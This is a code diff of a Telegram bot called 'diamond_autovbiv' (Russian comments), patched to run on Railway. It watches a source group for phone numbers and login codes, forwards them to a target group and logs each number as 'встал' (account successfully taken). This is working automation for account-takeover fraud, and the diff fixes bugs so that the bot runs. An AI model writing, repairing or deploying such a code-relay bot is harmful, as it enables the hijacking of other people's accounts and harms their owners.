@@ -1,5 +1,5 @@
 # diamond_autovbiv.py
-# ФИНАЛ: SOURCE (номер + код) → TARGET (номер + код + встал)
+# ИСПРАВЛЕННАЯ ВЕРСИЯ ДЛЯ RAILWAY
 
 import os
 import asyncio
@@ -16,7 +16,7 @@ API_HASH = os.environ.get("API_HASH", "")
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
 
 if not API_ID or not API_HASH or not BOT_TOKEN:
-    print("❌ Ошибка: Установите переменные в Railway")
+    print("❌ Ошибка: Установите переменные в Railway: API_ID, API_HASH, BOT_TOKEN")
     exit(1)
 
 # ========== БАЗА ДАННЫХ ==========
@@ -89,7 +89,6 @@ class DiamondDB:
         return row if row else (None, None)
     
     def add_pending_number(self, user_id, phone):
-        """Сохраняем номер, ждём код"""
         self.cursor.execute('''
             INSERT INTO pending (user_id, phone, status, created_at)
             VALUES (?, ?, 'waiting_code', ?)
@@ -98,7 +97,6 @@ class DiamondDB:
         return self.cursor.lastrowid
     
     def update_pending_with_code(self, phone, code):
-        """Обновляем запись с кодом"""
         self.cursor.execute('''
             UPDATE pending SET code = ?, status = 'code_received'
             WHERE phone = ? AND status = 'waiting_code'
@@ -106,7 +104,6 @@ class DiamondDB:
         self.conn.commit()
     
     def mark_success(self, phone):
-        """Помечаем как успешный встав"""
         self.cursor.execute('''
             UPDATE pending SET status = 'success' WHERE phone = ? AND status = 'code_received'
         ''', (phone,))
@@ -129,7 +126,6 @@ class DiamondDB:
         return dict(self.cursor.fetchall())
     
     def get_last_pending_number(self, user_id):
-        """Получаем последний номер без кода"""
         self.cursor.execute('''
             SELECT phone FROM pending 
             WHERE user_id = ? AND status = 'waiting_code' 
@@ -305,12 +301,11 @@ async def setup_handlers():
         db.set_groups(user_id, source_group, target_group)
         await event.reply(f"✅ **ГРУППА 1 (SOURCE) установлена!**\n\n📌 Сюда бот будет смотреть номера и коды")
         
-        # Запускаем слушатель
         session_string, _, _ = db.get_session(user_id)
         if session_string:
             client = await get_user_client(user_id, session_string)
             if client and source_group:
-                await start_source_listener(user_id, client, source_group, event.chat_id)
+                asyncio.create_task(start_source_listener(user_id, client, source_group, event.chat_id))
     
     @bot.on(events.NewMessage(pattern='/set_target'))
     async def set_target_cmd(event):
@@ -341,13 +336,23 @@ async def setup_handlers():
         msg += f"📤 ГРУППА 2 (отправка+встал): {target_group or '❌'}\n"
         await event.reply(msg, parse_mode='markdown')
     
+    @bot.on(events.NewMessage(pattern='/reset'))
+    async def reset_cmd(event):
+        user_id = event.sender_id
+        if user_id in user_clients:
+            await user_clients[user_id].disconnect()
+            del user_clients[user_id]
+        db.cursor.execute('DELETE FROM sessions WHERE user_id = ?', (user_id,))
+        db.cursor.execute('DELETE FROM groups WHERE user_id = ?', (user_id,))
+        db.conn.commit()
+        await event.reply("✅ Все данные сброшены. Используйте /login для входа.")
+    
     # ========== ОСНОВНАЯ ЛОГИКА ==========
     async def start_source_listener(user_id, client, source_group_id, notify_chat_id):
         """Слушаем ГРУППУ 1 — здесь номера и коды"""
         
         @client.on(events.NewMessage(chats=source_group_id))
         async def handle_source_messages(event):
-            # Игнорируем свои сообщения
             if event.sender_id == (await client.get_me()).id:
                 return
             
@@ -358,11 +363,9 @@ async def setup_handlers():
             if phone_match:
                 phone = phone_match.group(1)
                 
-                # Сохраняем номер в БД
                 db.add_pending_number(user_id, phone)
                 db.add_stat(user_id, phone, 'number_taken')
                 
-                # Отправляем НОМЕР в TARGET группу
                 _, target_group = db.get_groups(user_id)
                 if target_group:
                     await client.send_message(
@@ -375,20 +378,17 @@ async def setup_handlers():
                         f"📱 **Взял номер:** `{phone}`\n➡️ Отправлен в целевую группу"
                     )
             
-            # 2. Ищем КОД (4-8 цифр, не похож на номер)
+            # 2. Ищем КОД
             code_match = re.search(r'\b(\d{4,8})\b', text)
             if code_match and not phone_match:
                 code = code_match.group(1)
                 
-                # Находим последний номер без кода
                 last_phone = db.get_last_pending_number(user_id)
                 
                 if last_phone:
-                    # Обновляем запись с кодом
                     db.update_pending_with_code(last_phone, code)
                     db.add_stat(user_id, last_phone, 'code_taken')
                     
-                    # Отправляем КОД в TARGET группу
                     _, target_group = db.get_groups(user_id)
                     if target_group:
                         await client.send_message(
@@ -403,7 +403,6 @@ async def setup_handlers():
     
     @bot.on(events.NewMessage())
     async def handle_target_messages(event):
-        """Слушаем ГРУППУ 2 — здесь пишут 'встал'"""
         user_id = event.sender_id
         _, target_group = db.get_groups(user_id)
         
@@ -412,21 +411,15 @@ async def setup_handlers():
         
         text = event.raw_text.lower()
         
-        # Ищем "встал" или "успех"
         if 'встал' in text or 'успех' in text or 'success' in text:
-            # Ищем номер в сообщении
             phone_match = re.search(r'(\+?\d{10,15})', text)
             if phone_match:
                 phone = phone_match.group(1)
                 
-                # Помечаем как успех
                 db.mark_success(phone)
                 db.add_stat(user_id, phone, 'success')
                 
-                await bot.send_message(
-                    event.chat_id,
-                    f"✅ **{phone} — ВСТАЛ!**\n💎 Аккаунт успешно автовбит!"
-                )
+                await event.reply(f"✅ **{phone} — ВСТАЛ!**\n💎 Аккаунт успешно автовбит!")
     
     # Запускаем слушатели
     async def start_listeners():
@@ -438,7 +431,7 @@ async def setup_handlers():
             if session_string and source_group:
                 client = await get_user_client(user_id, session_string)
                 if client:
-                    await start_source_listener(user_id, client, source_group, user_id)
+                    asyncio.create_task(start_source_listener(user_id, client, source_group, user_id))
     
     asyncio.create_task(start_listeners())
 
@@ -448,8 +441,9 @@ async def main():
     print("💎 DIAMOND AUTOVBIV BOT — ФИНАЛЬНАЯ ВЕРСИЯ")
     print(f"📡 API_ID: {API_ID}")
     
-    bot = TelegramClient("diamond_bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
-    await bot.connect()
+    # ПРАВИЛЬНАЯ инициализация бота
+    bot = TelegramClient("diamond_bot", API_ID, API_HASH)
+    await bot.start(bot_token=BOT_TOKEN)
     
     await setup_handlers()
     print("✅ Бот запущен!")
